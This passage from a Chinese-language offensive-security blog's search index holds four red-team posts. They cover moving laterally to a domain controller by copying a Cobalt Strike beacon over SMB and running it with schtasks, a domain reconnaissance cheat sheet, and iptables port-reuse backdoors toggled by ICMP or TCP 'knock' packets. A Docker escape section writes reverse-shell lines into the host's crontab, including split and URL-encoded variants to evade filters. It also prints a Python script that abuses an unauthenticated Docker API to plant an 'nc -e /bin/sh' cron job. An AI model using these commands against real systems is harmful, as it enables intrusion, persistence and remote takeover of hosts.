        <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>对 DC(10.10.10.2)目标主机建立共享连接，并查看目标主机共享资源。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\10.10.10.2 /user:administrator <span class="string">&quot;JDredteam666&quot;</span></span><br><span class="line">shell net view \\10.10.10.2</span><br></pre></td></tr></table></figure><p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109170638929.png" alt="image-20210109170638929"></p><p>列出目标主机 C 盘下目录文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\10.10.10.2\C$</span><br></pre></td></tr></table></figure><p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109170959454.png" alt="image-20210109170959454"></p><p>将CS木马上传到跳板机。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload C:\Users\asus\Desktop\beacon.exe (C:\Users\Server\Desktop\beacon.exe)</span><br></pre></td></tr></table></figure><p>将server(192.168.111.3)跳板机的木马文件copy到DC(10.10.10.2)目标机的C共享盘下。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy C:\Users\Server\Desktop\beacon.exe \\10.10.10.2\C$</span><br></pre></td></tr></table></figure><p>远程创建Win 2012(192.168.200.66)目标机计划任务执行木马文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /s 10.10.10.2 /u administrator /p <span class="string">&quot;JDredteam&quot;</span> /sc MINUTE /mo 1 /tn <span class="built_in">test</span> /tr <span class="string">&quot;C:\\beacon.exe&quot;</span></span><br></pre></td></tr></table></figure><p>成功上线，该会话为被动连接，不操作的不会回连，如果中转机会话断掉，该会话也会断掉。</p><p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109202117004.png" alt="image-20210109202117004"></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域操作基本命令</title>
      <link href="2021/04/20/%E5%9F%9F%E6%93%8D%E4%BD%9C%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
      <url>2021/04/20/%E5%9F%9F%E6%93%8D%E4%BD%9C%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="域操作基础命令"><a href="#域操作基础命令" class="headerlink" title="域操作基础命令"></a>域操作基础命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">net group &#x2F;domain                 获得所有域用户组列表</span><br><span class="line">net group xxxxx &#x2F;domain              显示域中xxxxx组的成员</span><br><span class="line">net group xxxxx &#x2F;del &#x2F;domain           删除域中xxxxx组</span><br><span class="line">net group xxxxx xy &#x2F;del &#x2F;domain          删除域内xxxxx 群组中的xy成员</span><br><span class="line">net group xxxxx &#x2F;add &#x2F;domain           增加域中的群组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain         获得域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; &#x2F;domain       获得企业管理员列表</span><br><span class="line">net localgroup administrators &#x2F;domain       获取域内置administrators组用（enterprise admins、domain admins）</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain      获得域控制器列表</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain       获得所有域成员计算机列表</span><br><span class="line">net user &#x2F;domain                 获得所有域用户列表</span><br><span class="line">net user xxxx &#x2F;domain               获得指定账户xxxx的详细信息</span><br><span class="line">net accounts &#x2F;domain               获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">net view &#x2F;domain                 查询有几个域, 查询域列表</span><br><span class="line">net view &#x2F;domain:xxxx               查看 xxxx域中的计算机列表</span><br><span class="line">nltest &#x2F;domain_trusts               获取域信任信息</span><br><span class="line">net user domain-admin &#x2F;domain           查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</span><br><span class="line">net config Workstation              查询机器属于哪个域</span><br><span class="line">net time &#x2F;domian                 查询主域服务器的时间</span><br><span class="line">echo %logonserver%                查看登陆到这台服务器的计算机名</span><br><span class="line">gpupdate&#x2F;force                  更新域策略</span><br><span class="line">tasklist &#x2F;S ip &#x2F;U domain\username &#x2F;P &#x2F;V      查看远程计算机进程</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux利用iptables做端口复用</title>
      <link href="2021/04/20/Linux%E5%88%A9%E7%94%A8iptables%E5%81%9A%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/"/>
      <url>2021/04/20/Linux%E5%88%A9%E7%94%A8iptables%E5%81%9A%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux利用iptables做端口复用"><a href="#Linux利用iptables做端口复用" class="headerlink" title="Linux利用iptables做端口复用"></a>Linux利用iptables做端口复用</h2><h3 id="方案一：-根据源地址做端口复用"><a href="#方案一：-根据源地址做端口复用" class="headerlink" title="方案一：(根据源地址做端口复用)"></a>方案一：(根据源地址做端口复用)</h3><p>以下这条命令的作用是将来自192.168.10.13的访问80端口的流量都重定向到22端口。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -s 192.168.10.13 --dport 80 -j REDIRECT --to-port 22</span><br></pre></td></tr></table></figure><p>但是这样做有一个问题就是，我们访问目标主机80端口的流量都会被转给22端口。如果我们不用访问该HTTP服务的话，这是一个好的办法。实战中，我们一般是用VPS连接不用访问HTTP服务，所以在实战中该方法用的比较多。</p><h3 id="方案二：-根据源地址源端口做端口复用"><a href="#方案二：-根据源地址源端口做端口复用" class="headerlink" title="方案二：(根据源地址源端口做端口复用)"></a>方案二：(根据源地址源端口做端口复用)</h3><p>以下的命令是根据源地址源端口做端口复用，也就是只有来自192.168.10.13主机的33333端口的访问80端口的流量会被转给22端口.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -s 192.168.10.13 --sport 33333 --dport 80 -j REDIRECT --to-port 22</span><br></pre></td></tr></table></figure><p>然后我们本机先用socat将本地44444端口的流量以源端口33333访问192.168.10.129的80，然后我们SSH本地的44444端口即可。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nohup socat tcp-listen:44444,fork,reuseaddr tcp:192.168.10.129:80,sourceport=33333,reuseaddr &amp;</span><br><span class="line">ssh -p 44444 root@127.0.0.1</span><br></pre></td></tr></table></figure><p>但是这样做有一个问题就是不支持多连接 如果想创建两个 SSH 连接就会出错，因为本地的33333 端口已经被第一个 SSH 连接占用了。</p><h3 id="方案三：-利用ICMP协议做遥控开关"><a href="#方案三：-利用ICMP协议做遥控开关" class="headerlink" title="方案三：(利用ICMP协议做遥控开关)"></a>方案三：(利用ICMP协议做遥控开关)</h3><p>利用 ICMP 做遥控开关。缺点在于如果目标在内网，你是无法直接 ping 到它的。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -N LETMEIN       <span class="comment">#创建端口复用链</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22  <span class="comment">#创建端口复用规则，将流量转发至 22 端口</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length1139 -m recent --<span class="built_in">set</span> --name letmein --rsource -j ACCEPT  <span class="comment">#开启开关，如果接收到一个长为 1139 的 ICMP 包，则将来源 IP 添加到加为letmein的列表中</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length1140 -m recent --name letmein --remove -j ACCEPT      <span class="comment">#关闭开关，如果接收到一个长为 1140 的 ICMP 包，则将来源 IP 从 letmein 列表中去掉</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN   <span class="comment">#如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开启复用</span><br><span class="line">ping -c 1 -s 1111 192.168.10.129        <span class="comment">#向目标发送一个长度为 1111 的 ICMP 数据包（加上包头28，总长度实际为1139）</span></span><br><span class="line"></span><br><span class="line">关闭复用</span><br><span class="line">ping -c 1 -s 1112 192.168.10.129        <span class="comment">#向目标发送一个长度为 1112 的 ICMP 数据包（加上包头 28，总长度实际为 1140）</span></span><br></pre></td></tr></table></figure><h3 id="方案四：-利用TCP协议做遥控开关"><a href="#方案四：-利用TCP协议做遥控开关" class="headerlink" title="方案四：(利用TCP协议做遥控开关)"></a>方案四：(利用TCP协议做遥控开关)</h3><p>利用 tcp 数据包中的关键字做遥控开关，不怕目标在内网。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -N LETMEIN    <span class="comment">#创建端口复用链</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22 <span class="comment">#创建端口复用规则，将流量转发至 22 端口</span></span><br><span class="line"></span><br><span class="line">iptables -A INPUT -p tcp -m string --string <span class="string">&#x27;threathuntercoming&#x27;</span> --algo bm -m recent --<span class="built_in">set</span> --name letmein --rsource -j ACCEPT  <span class="comment">#开启开关，如果接收到一个含有threathuntercoming的TCP包，则将来源 IP 添加到加为letmein的列表中</span></span><br><span class="line"></span><br><span class="line">iptables -A INPUT -p tcp -m string --string <span class="string">&#x27;threathunterleaving&#x27;</span> --algo bm -m recent --name letmein --remove -j ACCEPT    <span class="comment">#关闭开关，如果接收到一个含有threathunterleaving的TCP包，则将来源 IP 从letmein的列表中移除</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN   <span class="comment">#如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开启复用，开启后本机到目标 80 端口的流量将转发至目标的 SSH</span><br><span class="line"><span class="built_in">echo</span> threathuntercoming | socat - tcp:192.168.10.129:80</span><br><span class="line"></span><br><span class="line">关闭复用，关闭后，80 恢复正常：</span><br><span class="line"><span class="built_in">echo</span> threathunterleaving | socat - tcp:192.168.10.129:80</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker逃逸</title>
      <link href="2021/04/19/docker%E9%80%83%E9%80%B8/"/>
      <url>2021/04/19/docker%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="使用特权模式启动容器的docker逃逸方法"><a href="#使用特权模式启动容器的docker逃逸方法" class="headerlink" title="使用特权模式启动容器的docker逃逸方法"></a>使用特权模式启动容器的docker逃逸方法</h1><p>使用特权模式启动镜像</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged 2c047404e52d /bin/bash</span><br></pre></td></tr></table></figure><p>考虑到部署环境时大多使用vulhub的镜像，所以这里给出修正方案是在docker-compose.yml文件中添加一个字段，如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privileged: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106133232264.png" alt="image-20210106133232264"></p><p>修改完成后执行如下命令启动：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>通过漏洞利用拿到docker 容器的shell后：</p><p>查看磁盘文件：fdisk -l</p><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106102824909.png" alt="image-20210106102824909"></p><p> 从返回结果来看sda1、sda2、sda5在/dev目录下。 </p><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106102909850.png" alt="image-20210106102909850"></p><p>新建一个目录/test，将/dev/sda5挂载到新建的目录下，并查看test目录下的内容，发现可以访问宿主机上/目录下的内容了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ./<span class="built_in">test</span></span><br><span class="line">mount /dev/sda5 ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106103015017.png" alt="image-20210106103015017"> </p><p>将反弹shell的命令写成一个脚本crontabshell存在/tmp下面</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建shell脚本文件</span></span><br><span class="line">touch ./<span class="built_in">test</span>/tmp/crontabshell</span><br><span class="line"><span class="comment">#写入反弹shell命令</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/bin/bash&quot;</span> &gt; ./<span class="built_in">test</span>/tmp/crontabshell</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.20.133/8888 0&gt;&amp;1 &amp;&quot;</span> &gt;&gt; ./<span class="built_in">test</span>/tmp/crontabshell</span><br><span class="line"><span class="comment">#添加执行权限</span></span><br><span class="line">chmod 755 ./<span class="built_in">test</span>/tmp/crontabshell</span><br></pre></td></tr></table></figure><p><strong>==可能遇到的问题==</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">当命令执行有长度限制时，解决办法如下：</span></span><br><span class="line">echo &quot;#!/bin/bash&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;bash -i &quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;bash -i &quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;&gt;&amp; /dev/&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;tcp/192.&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;168.137.&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;235/7777&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot; 0&gt;&amp;1 &amp;&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line"><span class="meta">#</span><span class="bash">如果遇到&amp; &gt;等特殊符号写不进去可以尝试编码之后再写，如下：</span></span><br><span class="line">touch ./test/tmp/crontabshell</span><br><span class="line">echo &quot;#!/bin/bash&quot; &gt; ./test/tmp/crontabshell</span><br><span class="line">echo &quot;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.137.235%2F7777%200%3E%261%20%26&quot; &gt;&gt; ./test/tmp/crontabshell</span><br></pre></td></tr></table></figure><p>在系统计划任务里写入执行脚本的定时任务：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/1 * * * * root /tmp/crontabshell&quot;</span> &gt;&gt; ./<span class="built_in">test</span>/etc/crontab</span><br><span class="line"><span class="comment">#编码结果如下：</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*%2F1%20*%20*%20*%20*%20root%20%2Ftmp%2Fcrontabshell&quot;</span> &gt;&gt; ./<span class="built_in">test</span>/etc/crontab</span><br></pre></td></tr></table></figure><p>在攻击机上开启netcat监听7777端口，成功接收到宿主主机的Shell，实现Docker逃逸。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106185232646.png" alt="image-20210106185232646"></p><h1 id="docker-daemon-api-未授权访问"><a href="#docker-daemon-api-未授权访问" class="headerlink" title="docker daemon api 未授权访问"></a>docker daemon api 未授权访问</h1><p>访问your-ip:2375/version验证是否搭建成功</p><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210107154914903.png" alt="image-20210107154914903"></p><p>利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://192.168.11.160:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, <span class="string">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;*/1 * * * * /usr/bin/nc 192.168.11.1 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vuln </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
